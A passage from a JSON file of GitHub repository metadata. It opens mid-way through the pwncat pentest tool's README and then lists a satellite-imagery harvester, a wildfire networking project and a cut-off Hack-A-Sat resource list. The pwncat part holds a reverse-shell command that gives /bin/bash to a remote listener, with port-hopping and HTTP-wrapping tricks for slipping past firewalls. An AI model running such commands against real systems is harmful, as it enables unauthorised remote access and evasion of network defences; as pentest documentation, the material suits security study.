expand</summary>\\n-->\\n\\n#### Local TCP port forwarding\\n\\n**Scenario**\\n1. Alice can be reached from the Outside (TCP/UDP)\\n2. Bob can only be reached from Alice's machine\\n```\\n | |\\n Outside | DMZ | private subnet\\n | |\\n | |\\n +-----------------+ TCP +-----------------+ TCP +-----------------+\\n | The cat | -----|----> | Alice | -----|----> | Bob |\\n | | | | pwncat | | | MySQL |\\n | 56.0.0.1 | | | 72.0.0.1:3306 | | | 10.0.0.1:3306 |\\n +-----------------+ | +-----------------+ | +-----------------+\\n pwncat 72.0.0.1 3306 | pwncat \\\\ |\\n | -L 72.0.0.1:3306 \\\\ |\\n | 10.0.0.1 3306 |\\n```\\n\\n#### Local UDP port forwarding\\n\\n**Scenario**\\n1. Alice can be reached from the Outside (but only via UDP)\\n2. Bob can only be reached from Alice's machine\\n```\\n | |\\n Outside | DMZ | private subnet\\n | |\\n | |\\n +-----------------+ UDP +-----------------+ TCP +-----------------+\\n | The cat | -----|----> | Alice | -----|----> | Bob |\\n | | | | pwncat -L | | | MySQL |\\n | 56.0.0.1 | | | 72.0.0.1:3306 | | | 10.0.0.1:3306 |\\n +-----------------+ | +-----------------+ | +-----------------+\\n pwncat -u 72.0.0.1 3306 | pwncat -u \\\\ |\\n | -L 72.0.0.1:3306 \\\\ |\\n | 10.0.0.1 3306 |\\n```\\n\\n#### Remote TCP port forward\\n\\n**Scenario**\\n1. Alice cannot be reached from the Outside\\n2. Alice is allowed to connect to the Outside (TCP/UDP)\\n3. Bob can only be reached from Alice's machine\\n```\\n | |\\n Outside | DMZ | private subnet\\n | |\\n | |\\n +-----------------+ TCP +-----------------+ TCP +-----------------+\\n | The cat | <----|----- | Alice | -----|----> | Bob |\\n | | | | pwncat | | | MySQL |\\n | 56.0.0.1 | | | 72.0.0.1:3306 | | | 10.0.0.1:3306 |\\n +-----------------+ | +-----------------+ | +-----------------+\\n pwncat -l 4444 | pwncat --reconn \\\\ |\\n | -R 56.0.0.1:4444 \\\\ |\\n | 10.0.0.1 3306 |\\n```\\n\\n#### Remote UDP port forward\\n\\n**Scenario**\\n1. Alice cannot be reached from the Outside\\n2. Alice is allowed to connect to the Outside (UDP: DNS only)\\n3. Bob can only be reached from Alice's machine\\n```\\n | |\\n Outside | DMZ | private subnet\\n | |\\n | |\\n +-----------------+ UDP +-----------------+ TCP +-----------------+\\n | The cat | <----|----- | Alice | -----|----> | Bob |\\n | | | | pwncat | | | MySQL |\\n | 56.0.0.1 | | | 72.0.0.1:3306 | | | 10.0.0.1:3306 |\\n +-----------------+ | +-----------------+ | +-----------------+\\n pwncat -u -l 53 | pwncat -u --reconn \\\\ |\\n | -R 56.0.0.1:4444 \\\\ |\\n | 10.0.0.1 3306 |\\n```\\n<!--\\n</details>\\n-->\\n\\n\\n### Outbound port hopping\\n\\nIf you have no idea what outbound ports are allowed from the target machine, you can instruct\\nthe client (e.g.: in case of a reverse shell) to probe outbound ports endlessly.\\n\\n```bash\\n# Reverse shell on target (the client)\\n# --exec # The command shell the client should provide\\n# --reconn # Instruct it to reconnect endlessly\\n# --reconn-wait # Reconnect every 0.1 seconds\\n# --reconn-robin # Use these ports to probe for outbount connections\\n\\npwncat --exec /bin/bash --reconn --reconn-wait 0.1 --reconn-robin 54-1024 10 10.0.0.1 53\\n```\\n\\nOnce the client is up and running, either use raw sockets to check for inbound traffic or use\\nsomething like Wireshark or tcpdump to find out from where the client is able to connect back to you,\\n\\nIf you found one or more ports that the client is able to connect to you,\\nsimply start your listener locally and wait for it to come back.\\n```bash\\npwncat -l <ip> <port>\\n```\\nIf the client connects to you, you will have a working reverse shell. If you stop your local\\nlistening server accidentally or on purpose, the client will probe ports again until it connects successfully.\\nIn order to kill the reverse shell client, you can use `--safe-word` (when starting the client).\\n\\n\\nIf none of this succeeds, you can add other measures such as using UDP or even wrapping your\\npackets into higher level protocols, such as HTTP or others. See [PSE](pse) or examples below\\nfor how to transform your traffic.\\n\\n\\n### Pwncat Scripting Engine ([PSE](pse))\\n\\n`pwncat` offers a Python based scripting engine to inject your custom code before sending and\\nafter receiving data.\\n\\n#### How it works\\n\\nYou will simply need to provide a Python file with the following entrypoint function:\\n```python\\ndef transform(data, pse):\\n # Example to reverse a string\\n return data[::-1]\\n```\\nBoth, the function name must be named `transform` and the parsed arguments must be named `data` and `pse`.\\nOther than that you can add as much code as you like. Each instance of `pwncat` can take two scripts:\\n\\n1. `--script-send`: script will be applied before sending\\n2. `--script-recv`: script will be applied after receiving\\n\\nSee [here](pse) for API and more details\\n\\n\\n#### Example 1: Self-built asymmetric encryption\\n\\n> PSE: [asym-enc](pse/asym-enc) source code\\n\\nThis will encrypt your traffic asymmetrically. It is just a very basic [ROT13](https://en.wikipedia.org/wiki/ROT13) implementation with different shift lengths on both sides to *emulate* asymmetry. You could do the same and implement GPG based asymmetric encryption for PSE.\\n\\n```bash\\n# server\\npwncat -vvvv -l localhost 4444 \\\\\\n --script-send pse/asym-enc/pse-asym_enc-server_send.py \\\\\\n --script-recv pse/asym-enc/pse-asym_enc-server_recv.py\\n```\\n```bash\\n# client\\npwncat -vvvv localhost 4444 \\\\\\n --script-send pse/asym-enc/pse-asym_enc-client_send.py \\\\\\n --script-recv pse/asym-enc/pse-asym_enc-client_recv.py\\n```\\n\\n#### Example 2: Self-built HTTP POST wrapper\\n\\n> PSE: [http-post](pse/http-post) source code\\n\\nThis will wrap all traffic into a valid HTTP POST request, making it look like normal HTTP traffic.\\n\\n```bash\\n# server\\npwncat -vvvv -l localhost 4444 \\\\\\n --script-send pse/http-post/pse-http_post-pack.py \\\\\\n --script-recv pse/http-post/pse-http_post-unpack.py\\n```\\n```bash\\n# client\\npwncat -vvvv localhost 4444 \\\\\\n --script-send pse/http-post/pse-http_post-pack.py \\\\\\n --script-recv pse/http-post/pse-http_post-unpack.py\\n```\\n\\n### Port scanning\\n\\n#### TCP\\n```bash\\n$ sudo netstat -tlpn\\nActive Internet connections (only servers)\\nProto Recv-Q Send-Q Local Address Foreign Address State\\ntcp 0 0 127.0.0.1:631 0.0.0.0:* LISTEN\\ntcp 0 0 127.0.0.1:25 0.0.0.0:* LISTEN\\ntcp 0 0 127.0.0.1:4444 0.0.0.0:* LISTEN\\ntcp 0 0 0.0.0.0:902 0.0.0.0:* LISTEN\\ntcp6 0 0 ::1:631 :::* LISTEN\\ntcp6 0 0 ::1:25 :::* LISTEN\\ntcp6 0 0 ::1:4444 :::* LISTEN\\ntcp6 0 0 :::1053 :::* LISTEN\\ntcp6 0 0 :::902 :::* LISTEN\\n```\\n\\n#### UDP\\nThe following UDP ports are exposing:\\n```bash\\n$ sudo netstat -ulpn\\nActive Internet connections (only servers)\\nProto Recv-Q Send-Q Local Address Foreign Address\\nudp 0 0 0.0.0.0:631 0.0.0.0:*\\nudp 0 0 0.0.0.0:5353 0.0.0.0:*\\nudp 0 0 0.0.0.0:39856 0.0.0.0:*\\nudp 0 0 0.0.0.0:68 0.0.0.0:*\\nudp 0 0 0.0.0.0:68 0.0.0.0:*\\nudp6 0 0 :::1053 :::*\\nudp6 0 0 :::5353 :::*\\nudp6 0 0 :::57728 :::*\\n```\\n\\n##### nmap\\n```bash\\n$ time sudo nmap -T5 localhost --version-intensity 0 -p- -sU\\nStarting Nmap 7.70 ( https://nmap.org ) at 2020-05-24 17:03 CEST\\nWarning: 127.0.0.1 giving up on port because retransmission cap hit (2).\\nNmap scan report for localhost (127.0.0.1)\\nHost is up (0.000035s latency).\\nOther addresses for localhost (not scanned): ::1\\nNot shown: 65529 closed ports\\nPORT STATE SERVICE\\n68/udp open|filtered dhcpc\\n631/udp open|filtered ipp\\n1053/udp open|filtered remote-as\\n5353/udp open|filtered zeroconf\\n39856/udp open|filtered unknown\\n40488/udp open|filtered unknown\\n\\nNmap done: 1 IP address (1 host up) scanned in 179.15 seconds\\n\\nreal 2m52.446s\\nuser 0m0.844s\\nsys 0m2.571s\\n```\\n##### netcat\\n```bash\\n$ time nc -z localhost 1-65535 -u -4 -v\\nConnection to localhost 68 port [udp/bootpc] succeeded!\\nConnection to localhost 631 port [udp/ipp] succeeded!\\nConnection to localhost 1053 port [udp/*] succeeded!\\nConnection to localhost 5353 port [udp/mdns] succeeded!\\nConnection to localhost 39856 port [udp/*] succeeded!\\n\\nreal 0m18.734s\\nuser 0m1.004s\\nsys 0m2.634s\\n```\\n##### pwncat\\n```bash\\n$ time pwncat -z localhost 1-65535 -u -4\\nScanning 65535 ports\\n[+] 68/UDP open (IPv4)\\n[+] 631/UDP open (IPv4)\\n[+] 1053/UDP open (IPv4)\\n[+] 5353/UDP open (IPv4)\\n[+] 39856/UDP open (IPv4)\\n\\nreal 0m7.309s\\nuser 0m6.465s\\nsys 0m4.794s\\n```\\n\\n\\n## :information_source: FAQ\\n\\n**Q**: Is `pwncat` compatible with `netcat`?\\n\\n**A**: Yes, it is fully compatible in the way it behaves in connect, listen and zero-i/o mode.\\nYou can even mix `pwncat` with `netcat`, `ncat` or similar tools.\\n\\n\\n**Q**: Does it work on X?\\n\\n**A**: In its current state it works with Python 2, 3 pypy2 and pypy3 and is fully tested on Linux and MacOS. Windows support is available, but is considered experimental (see [integration tests](https://github.com/cytopia/pwncat/actions)).\\n\\n\\n**Q**: I found a bug / I have to suggest a new feature! What can I do?\\n\\n**A**: For bug reports or enhancements, please open an issue [here](https://github.com/cytopia/pwncat/issues).\\n\\n\\n**Q**: How can I support this project?\\n\\n**A**: Thanks for asking! First of all, star this project to give me some feedback and see [CONTRIBUTING.md](CONTRIBUTING.md) for details.\\n\\n\\n## :sunrise: Artwork\\n\\n<table>\\n <thead>\\n <tr>\\n <th>Type</th>\\n <th>Artist</th>\\n <th>Image</th>\\n <th>License</th>\\n </tr>\\n </thead>\\n <tbody>\\n <tr>\\n <td>Logo</td>\\n <td><a href=\\\"https://github.com/maifz\\\">maifz</a></td>\\n <td><a href=\\\"art/logo.png\\\"><img src=\\\"art/logo.png\\\" style=\\\"height:128px;\\\" height=\\\"128\\\" alt=\\\"pwncat logo\\\" title=\\\"pwncat logo\\\" /></a></td>\\n <td><a href=\\\"https://creativecommons.org/licenses/by-sa/4.0/\\\"><img src=\\\"https://i.creativecommons.org/l/by-sa/4.0/88x31.png\\\" /></a></td>\\n </tr>\\n <tr>\\n <td>Banner 1</td>\\n <td><a href=\\\"https://github.com/maifz\\\">maifz</a></td>\\n <td><a href=\\\"art/banner-1.png\\\"><img src=\\\"art/banner-1.png\\\" style=\\\"height:128px;\\\" height=\\\"128\\\" alt=\\\"pwncat banner\\\" title=\\\"pwncat banner\\\" /></a></td>\\n <td><a href=\\\"https://creativecommons.org/licenses/by-sa/4.0/\\\"><img src=\\\"https://i.creativecommons.org/l/by-sa/4.0/88x31.png\\\" /></a></td>\\n </tr>\\n <tr>\\n <td>Banner 2</td>\\n <td><a href=\\\"https://github.com/maifz\\\">maifz</a></td>\\n <td><a href=\\\"art/banner-2.png\\\"><img src=\\\"art/banner-2.png\\\" style=\\\"height:128px;\\\" height=\\\"128\\\" alt=\\\"pwncat banner\\\" title=\\\"pwncat banner\\\" /></a></td>\\n <td><a href=\\\"https://creativecommons.org/licenses/by-sa/4.0/\\\"><img src=\\\"https://i.creativecommons.org/l/by-sa/4.0/88x31.png\\\" /></a></td>\\n </tr>\\n </tbody>\\n</table>\\n\\n\\n## :lock: [cytopia](https://github.com/cytopia) sec tools\\n\\nBelow is a list of sec tools and docs I am maintaining.\\n\\n| Name | Category | Language | Description |\\n|----------------------|----------------------|------------|-------------|\\n| **[offsec]** | Documentation | Markdown | Offsec checklist, tools and examples |\\n| **[header-fuzz]** | Enumeration | Bash | Fuzz HTTP headers |\\n| **[smtp-user-enum]** | Enumeration | Python 2+3 | SMTP users enumerator |\\n| **[urlbuster]** | Enumeration | Python 2+3 | Mutable web directory fuzzer |\\n| **[pwncat]** | Pivoting | Python 2+3 | Cross-platform netcat on steroids |\\n| **[badchars]** | Reverse Engineering | Python 2+3 | Badchar generator |\\n| **[fuzza]** | Reverse Engineering | Python 2+3 | TCP fuzzing tool |\\n\\n[offsec]: https://github.com/cytopia/offsec\\n[header-fuzz]: https://github.com/cytopia/header-fuzz\\n[smtp-user-enum]: https://github.com/cytopia/smtp-user-enum\\n[urlbuster]: https://github.com/cytopia/urlbuster\\n[pwncat]: https://github.com/cytopia/pwncat\\n[badchars]: https://github.com/cytopia/badchars\\n[fuzza]: https://github.com/cytopia/fuzza\\n\\n\\n## :octocat: Contributing\\n\\nSee **[Contributing guidelines](CONTRIBUTING.md)** to help to improve this project.\\n\\n\\n## :exclamation: Disclaimer\\n\\nThis tool may be used for legal purposes only. Users take full responsibility for any actions performed using this tool. The author accepts no liability for damage caused by this tool. If these terms are not acceptable to you, then do not use this tool.\\n\\n\\n## :page_facing_up: License\\n\\n**[MIT License](LICENSE.txt)**\\n\\nCopyright (c) 2020 **[cytopia](https://github.com/cytopia)**\\n\"", "topics": ["bind-shell", "local-port-forward", "local-port-forwarding", "nc", "ncat", "netcat", "penetration-testing", "pentest", "pentest-tool", "pentesting", "pentesting-python", "pentesting-tool", "pivoting", "port-forwarding", "portforward", "pwncat", "remote-port-forward", "remote-port-forwarding", "remote-shell", "reverse-shell"], "writeup": "", "ignoredescription": false, "id": 11, "full_name": "cytopia/pwncat", "url": "https://github.com/cytopia/pwncat"},
{"tags": ["gis", "usgs"], "owner": "datalogistics", "description": "", "name": "eodn-harvester", "topics_string": "gis usgs", "language": "Python", "readme": "\"\\n# About\\n\\nEODNHarvester is a daemon that gathers scenes from the United States Geological Survey (USGS) using the USGS JSON interface. The USGS hosts satellite imagery collected by a number of sensors. These images (a collection of images of a single location - e.g. Standard and Infared - is called a scene) are uploaded to the Earth Observation Depot Network (EODN) for use and data collection.\\n\\n# Installation\\n\\nEODNHarvester is a python script and can be installed using the `setup.py` script. This requires Python3.x.\\n\\n## Prerequisites\\n\\nEnsure your system has python3.x installed.\\n\\n python3 -V\\n\\nIf python3 is not installed, the process will depend on your OS.\\n\\nNOTE: Python3 must be installed as a alternate version of Python on RedHat (and RedHat derived distributions) as yum requires Python2 to be the primary python version.\\n\\n## EODNHarvester\\n\\nEODNHarvester can be installed simply by calling the `setup.py` script.\\n\\n ./setup.py build\\n\\nThen again to install:\\n\\n ./setup.py install\\n\\nIf necessary, a prefix can be provided to install to an explicit bin folder. The following will install eodnharvester to the /usr/local/bin folder:\\n\\n ./setup.py install --prefix=/usr/local\\n\\n\\n# Usage\\n\\nEODNHarvester is designed to be a mostly self sufficient daemon, and can be run simply by calling:\\n\\n eodnharvesterd\\n\\nIf this does not work, ensure that the EODNHarvester has been installed to a directory in your path. For debugging purposes, two flags are available:\\n\\n eodnharvesterd -v\\n\\nand\\n\\n eodnharvesterd -D\\n\\nThe former will output more verbose messages, while the latter will output more robust debugging logging.\\n\\nBy default, the EODNHarvester runs as a standard script, by passing the `-d` flag, it will run as a daemon.\\n\\n eodnharvesterd -d\\n\\nTo set up a new configuration for EODNHarvester, run with the -c flag and follow the instructions in the interface.\\n\\n eodnharvesterd -c\\n\\n\\n## Settings\\n\\nEODNHarvester also includes a large number of settings in the `eodnharvester/settings.py' file. These settings will not take effect unless the project is re-built and re-installed.\\n\\n VERBOSE | This is an override for the -v flag.\\n | If set to true will always emit verbose messages.\\n DEBUG | Same as above for the -D flag.\\n THREADS | Sets the number of threads for the script to use.\\n MAX_RECONNECT | The number of times the EODNHarvester will attempt\\n | to contact USGS before sleeping.\\n HARVEST_WINDOW | How often the EODNHarvester will collect scenes.\\n WORKSPACE | The directory to store the files currently being harvested.\\n | These files are temporary and removed on harvest completion.\\n USGS_HOST | The url used to contact the USGS.\\n USERNAME | The username used to log in to USGS.\\n PASSWORD | The password used to log in to USGS.\\n TIMEOUT | The amount of time to wait before retrying network connections.\\n DATASET_NAME | The USGS satellite being collected from.\\n LOWER_LEFT | The latitude and longitude coordinates of the lower left\\n | corner of the harvested area.\\n UPPER_RIGHT | The latitude and longitude coordinates of the upper right\\n | corner of the harvested area.\\n MAX_RESULTS | The number of scenes harvested in a single pass\\n | (Timeouts occur more often above 15 results)\\n SORT_ORDER | The order to recieve results from USGS in.\\n NODE | The type of data being recieved from USGS.\\n UNIS_HOST | The url or ip of the UNIS instance used to store exnode information.\\n UNIS_PORT | The port number of the UNIS instance used to store exnode information.\\n LoRS | Settings for the LoRS upload. (Read the LoRS documentation\\n | for more info on these settings).\\n REPORT_HOUR | What hour of the day the periodic report should be sent out.\\n REPORT_EMAIL | The email to send reports to.\\n AUTH_FIELD | Where to store security information in the exnode.\\n AUTH_VALUE | The token used for the exnode.\\n\\n VALIDATION_GRANULARITY | Size of chunks to be used when checking\\n | files for correctness.\\n DOWNLOAD_CHUNKSIZE | Chunk size to use when downloading data from USGS.\"", "topics": [], "writeup": "EODNHarvester is a daemon that gathers scenes from the United States Geological Survey (USGS) using the USGS JSON interface. The USGS hosts satellite imagery collected by a number of sensors. These images (a collection of images of a single location - e.g. Standard and Infared - is called a scene) are uploaded to the Earth Observation Depot Network (EODN) for use and data collection.\n", "ignoredescription": false, "id": 12, "full_name": "datalogistics/eodn-harvester", "url": "https://github.com/datalogistics/eodn-harvester"},
{"tags": ["lora", "ATAK", "atak-civ", "image-classification"], "owner": "datalogistics", "description": "Code and scripts for applying DLT in a disconnected, challenged environment with a focus on wildfire incident response.", "name": "wildfire-dln", "topics_string": "lora atak atak-civ image-classification", "language": "C", "readme": "\"# Wildland Fire Data Logistics Network (WildfireDLN): An Implementation of Resilient Networking\\nWildfireDLN will deliver rich and informative data with a robust system that supports file transfer and access across disconnected, heterogeneous networks to address the needs of wildland firefighting operations for increased network coverage and data portability.\\n\\nProject Leads\\n* __Nancy HF French (PI)__, Michigan Tech Research Institute\\n* __D Martin Swany__, Indiana University\\n* __Micah Beck__, University of Tennessee, Knoxville\\n\"", "topics": [], "writeup": "Wildland Fire Data Logistics Network (WildfireDLN): An Implementation of Resilient Networking WildfireDLN will deliver rich and informative data with a robust system that supports file transfer and access across disconnected, heterogeneous networks to address the needs of wildland firefighting operations for increased network coverage and data portability.\n", "ignoredescription": true, "id": 13, "full_name": "datalogistics/wildfire-dln", "url": "https://github.com/datalogistics/wildfire-dln"},
{"tags": ["space", "dod", "hacking"], "owner": "deptofdefense", "description": "Public library of space documents and tutorials", "name": "hack-a-sat-library", "topics_string": "space dod hacking", "language": "", "readme": "\"![Space Security Challeng 2020 Logo](./graphics/DDS-HASlibrary-logo.png \\\"Space Security Challeng 2020 Logo\\\")\\n\\n# HACK-A-SAT RESOURCE LIBRARY\\n\\nA collection of Resources for budding SAT hackers (Satellites, not the test\\u00af\\\\\\\\\\\\_(\\u30c4)\\\\_/\\u00af). *Note: This is an evolving resource, so please [contribute](./HASlibrary-contribute-instrxns.md) with a pull request*\\n\\n**Jump To**: [Web sites](#web-sites) | [Articles and Op-Eds](#articles-and-op-eds) | [Tools and Projects](#tools-and-projects) | [Videos](#videos) | [Books and White Papers](#books-and-white-papers) | [2020 Write-Ups](#hack-a-sat-2020-writeups) | [Programming Libraries](#programming-libraries) | [Miscellaneous](#miscellaneous) | [Contacts](#contacts)\\n\\n## BACKGROUND\\nThe democratization of space has opened up a new frontier for exploration and innovation. But with this opportunity, new cybersecurity vulnerabilities are also being created. One human can design, build and launch a satellite, adhering to very few standards and security protocols. So how can we achieve safe, reliable and trustworthy operations to truly realize the promise of space? ...BY HACKING A SATELLITE.\\n\\nThe United States Air Force, in conjunction with the Defense Digital Service, presents this year\\u2019s Space Security Challenge, Hack-A-Sat. This challenge asks hackers from around the world to focus their skills and creativity on solving cybersecurity challenges on space systems... THE QUESTION IS, HOW?\\n\\n## RESOURCES\\n\\n### Hack A Sat Workshops\\nWe are bringing a series of interactive workshops to DEF CON in complete Safemode via Twitch. Check out our vibrant, web-based virtual reality environment to access the workshops at [dds-virtual.com](https://dds-virtual.com/), otherwise, see the [github repo](https://github.com/deptofdefense/dds-at-DEFCON/blob/master/README.md) for the deets on game play for each of the work shops!\\n\\n### Hack A Sat Challenges \\n\\n- [Hack A Sat Qualifier Challenges](https://github.com/deptofdefense/HAS-Qualifier-Challenges) : Public version of the qualifier challenges from HAS 2020\\n\\n### Articles and Op-Eds\\n- Hackers could shut down satellites \\u2013 or turn them into weapons by William Akoto (https://theconversation.com/hackers-could-shut-down-satellites-or-turn-them-into-weapons-130932)\\n- Want to Hack a Satellite? It Might Be Easier Than You Think by Max Eddy with video presentation (https://forum.defcon.org/node/232085)\\n- It's Surprisingly Simple to Hack a Satellite by Lorenzo Franceschi-Bicchierai about Iridium hacking (https://forum.defcon.org/node/232079)\\n- Hacking Satellites Is Surprisingly Simple By Ryan Whitwam (https://www.extremetech.com/extreme/287284-hacking-satellites-is-probably-easier-than-you-think)\\n- Our satellites are prime targets for a cyberattack. And things could get worse. by Gergory Falco (https://www.washingtonpost.com/opinions/our-satellites-are-prime-targets-for-a-cyberattack-and-things-could-get-worse/2019/05/07/31c85438-7041-11e9-8be0-ca575670e91c_story.html)\\n\\n### Web Sites\\n- Satellite Orbits, Models, Methods, Applications, Oliver Montenbruck, Eberhard Gill (https://github.com/orbitalindex/awesome-space)\\n- Hackers Homepage on DSS signal hacking (https://hackershomepage.com/dss_hacking.htm)\\n- School Amateur Radio Club Network: \\\"a free on-line resource for anyone associated with or thinking about setting up a School Amateur Radio Club\\\"(https://sarcnet.org/)\\n- Satellite Projects (GOES Satellite Hunt and other), Lucas Teske (https://lucasteske.dev/satcom-projects/satellite-projects)\\n\\n### Tools and Projects\\n- **Mini Satellite-Antenna Rotator Mk1:** \\\"This project is a portable device used to automatically point a directional antenna towards an orbiting satellite.\\\"(https://forum.defcon.org/node/232474)\\n- **Webinar:** GNSS hacking, from satellite signals to hardware/software cybersecurity (https://www.youtube.com/watch?v=Au43CmiOO_g)\\n- **Presentation at RSA Conference 2019- Attack Vectors in Orbit:** The Need for IoT and Satellite Security by William J Malik, CISA: https://published-prd.lanyonevents.com/published/rsaus19/sessionsFiles/13692/MBS-W03-Attack-Vectors-in-Orbit-The-Need-for-IoT-and-Satellite-Security.pdf\\n- **Satellite Project:** Hackaday Satellite Projects (https://hackaday.io/list/4321-satellite-projects)\\n\\n[<<<Back to Top](#hack-a-sat-resource-library)\\n\\n### Videos\\n- Hacking Iridium Satellites With Iridium Toolkit by TechMinds (https://www.youtube.com/watch?v=usCJtuvXfPg)\\n- Iridium Satellite Hacking - HOPE XI 2016\\n(https://www.youtube.com/watch?v=cvKaC4pNvck&t=)\\n- SATCOM Terminals: Hacking by Air, Sea, and Land by Ruben Santamarta\\n(https://www.youtube.com/watch?v=YeKswEamOl4&t=)\\n- DEF CON 23 - Colby Moore - Spread Spectrum Satcom Hacking\\n(https://www.youtube.com/watch?v=2aBXpho5b7w&t=)\\n- 2012: Martin Rutishauser: Satellite Hacking: An Introduction\\n(https://www.youtube.com/watch?v=xIsG8GpB67A&t=)\\n- Reverse Engineering Satellite Based IP Content Distribution\\n(https://www.youtube.com/watch?v=U1WyBP4lKZk&t=)\\n- How to Reverse-Engineer a Satellite TV Smart Card\\n(https://www.youtube.com/watch?v=tnY7UVyaFiQ&t=)\\n- Reverse engineering Outernet (33c3)\\n(https://www.youtube.com/watch?v=TCoSRx7DpGY&t=)\\n- Reverse Engineering NOAA and ARGOS Satellite - Hot Topics - 9th September 2016\\n(https://www.youtube.com/watch?v=HjBMxoHTjCk&t=)\\n- Lucas Teske - Satellite Communications Reverse Engineering - H2HC 2016\\n(https://www.youtube.com/watch?v=SIxRyVKlpEo&t=)\\n- Spread Spectrum Satcom Hacking: Attacking The Globalstar Simplex Data Service\\n(https://www.youtube.com/watch?v=1VbmHmzofmc&t=)\\n- Hacking Iridium Satellites With Iridium Toolkit\\n(https://www.youtube.com/watch?v=usCJtuvXfPg&t=)\\n- Black Hat DC 2009 - Adam Laurie - Satellite Hacking for Fun and Profit\\n(https://www.youtube.com/watch?v=PyXZX63etog&t=)\\n- Stephan Gerling - Hacking Yachts Remotely via Satcom or Maritime Internet Router\\n(https://www.youtube.com/watch?v=mT7dXJ_ob8k&t=)\\n- Black Hat USA 2015 - Spread Spectrum Satcom Hacking Attacking The Globalstar Simplex Data Service\\n(https://www.youtube.com/watch?v=arPqhHQ-R4o&t=)\\n- SEC-T 2009 - Playing in a Satellite environment - Ram\\u00f3n Pinuaga\\n(https://www.youtube.com/watch?v=Z6FjVRYyCf4&t=)\\n- GPS As An Attack Vector\\n(https://www.youtube.com/watch?v=Duxr1yRKRoU&t=)\\n\\n[<<<Back to Top](#hack-a-sat-resource-library)\\n\\n### Books and White Papers\\n- **About:** Fundamentals of Astrodynamics and Applications, Third Edition by David A. Vallado\\n- **About:** Fundamentals of Spacecraft Attitude Determination and Control by F. Landis Markley, John L. Crassidis\\n- **About:** Satellite Communications Payload and System (https://ieeexplore.ieee.org/book/6305387)\\n- **How To:** Satellite Hacking: A Guide for the Perplexed: http://www.international-relations.com/CM2012/Satellite-Hacking.pdf\\n- **How To:** Satellite Network Hacking & Security Analysis by Adam Ali.Zare Hudaib (https://www.cscjournals.org/manuscript/Journals/IJCSS/Volume10/Issue1/IJCSS-1200.pdf)\\n- **How To:** Satellite Tool Kit Astronautics Primer by Jerry Jon Sellers Based on Understanding Space: An Introduction to Astronautics (http://lasp.colorado.edu/~lix/class/asen5050/stk_files/astroprimer.pdf)\\n- **How To:** NASA's Beginner's Guide to Rockets (https://www.grc.nasa.gov/www/k-12/rocket/bgmr.html)\\n- **How To:** CubeSat 101: Basic Concepts and Processes for First-Time CubeSat Developers (https://www.nasa.gov/sites/default/files/atoms/files/nasa_csli_cubesat_101_508.pdf)\\n- **How To:** Space Mission Engineering: The New SMAD (http://www.sme-smad.com/)\\n- **Types of Risks and Attacks:** MITIGATING CYBER SECURITY RISK IN SATELLITE GROUND SYSTEMS by Stephen F. Bichler, Maj, USAF (https://apps.dtic.mil/dtic/tr/fulltext/u2/1012754.pdf)\\n- **Types of Risks and Attacks:** Attack Vectors in Orbit: The Need for IoT and Satellite Security by William J Malik, CISA (https://published-prd.lanyonevents.com/published/rsaus19/sessionsFiles/13692/MBS-W03-Attack-Vectors-in-Orbit-The-Need-for-IoT-and-Satellite-Security.pdf)\\n- **Types of Risks and Attacks:** Cybersecurity Principles for Space Systems by Gregory Falco (https://2ea998fc-9f95-482a-87f8-dd57460966a8.filesusr.com/ugd/e741d3_daa22cd1e5234b8f9139fa9c7406be29.pdf)\\n- **Types of Risks and Attacks:** Electronic and Cyber Warfare in Outer Space by Rajeswari Pillai Rajagopalan (https://www.unidir.org/files/publications/pdfs/electronic-and-cyber-warfare-in-outer-space-en-784.pdf)\\n\\n[<<<Back to Top](#hack-a-sat-resource-library)\\n\\n### Hack-A-Sat 2020 Writeups\\n- Recap of the team Exodus Orbitals Alliance (192 out of 1278 teams)\\nhttps://blog.exodusorbitals.com/2020/05/26/hack-a-sat-2020-after-action-report/\\n- Where's the Sat? [HackaSat] [Writeup] by Philippe Delteil (https://medium.com/@pdelteil/wheres-the-sat-hack-a-sat-writeup-9a523634963b)\\n- Seeing Stars [HackASat] [Writeup] by Philippe Delteil (https://medium.com/@pdelteil/seeing-stars-hackasat-writeup-372e7859ca97)\\n- Track The Sat - Ground Segment by Keramas (https://keramas.github.io/2020/05/24/HackASat-CTF.html)\\n- 56k Flex Magic - Communication Systems by Keramas (https://keramas.github.io/2020/05/25/HackASat-Part2.html)\\n- 56k Flex Magic - Communication Systems by Tan (https://medium.com/@solomontan_68263/56k-flex-magic-hack-a-sat-2020-f63df73b7dfd)\\n- I Like to Watch \\u2013 Hack-A-Sat CTF Challenge Solution [Writeup] by Dawid Golunski (https://pentest.co.uk/insights/i-like-to-watch-hack-a-sat-challenge/)\\n- Hack-a-Sat CTF Writeup: My 0x20 (aka \\u201dMyspace\\u201d) [Writeup] by OH HAI THERE\\n(https://ohaithe.re/post/619784043448418304/hack-a-sat-ctf-writeup-my-0x20-aka-myspace)\\n- Hack-A-Sat 2020: Sun? On my Sat? [Writeup] by OH starfleetcadet75\\n(https://starfleetcadet75.github.io/writeups/2020/06/05/sun-on-my-sat.html)\\n- Vaporsec CTF team from DC 858/619 summarizes the event and lessons learned (https://www.facebook.com/DC858/videos/281579856584929/) \\n- LaunchLink - Hack-A-Sat Quals 2020 [Writeup] by erfur (https://erfur.github.io/LaunchLink_Hackasat/)\\n- Leaky Crypto - Hack-A-Sat Writeup: [Writeup] by ADDVulcan (https://github.com/ADDVulcan/ADDVulcan/tree/master/Payload%20Modules/Leaky%20Crypto) \\n\\n[<<<Back to Top](#hack-a-sat-resource-library)\\n\\n### Programming Libraries\\n- CCSDSPy: Provides an IO Interface for reading CCSDS data in Python. The CCSDS format is used for many NASA and ESA missions for low-level telemetry (https://ccsdspy.readthedocs.io/en/latest/)\\n- Satpy: Python library for reading and manipulating meteorological remote sensing data and writing it to various image and data file formats (https://github.com/pytroll/satpy)\\n- SGP4: Python version of the SGP4 satellite position library (https://github.com/brandon-rhodes/python-sgp4)\\n- Poliastro: Collection of Python functions useful in Astrodynamics and Orbital Mechanics, focusing on interplanetary applications. It provides a simple and intuitive API and handles physical quantities with units (https://docs.poliastro.space/en/stable/)\\n- Skyfield: Computes positions for the stars, planets, and satellites in orbit around the Earth (https://rhodesmill.org/skyfield/)\\n\\n[<<<Back to Top](#hack-a-sat-resource-library)\\n\\n### Miscellaneous\\n- SPACEX - ISS Docking Simulator: This simulator will familiarize you with the controls of the actual interface used by NASA Astronauts to manually pilot the SpaceX Dragon 2 vehicle to the International Space (https://iss-sim.spacex.com)\\n- Satellite, Junk, and Flare Tracking (https://www.satflare.com/home.asp)\\n- Feed Hunting and Satellite Mapping (http://www.feedhunter.com/)\\n\\n## CONTACTS\\n### Space and Satellite Security 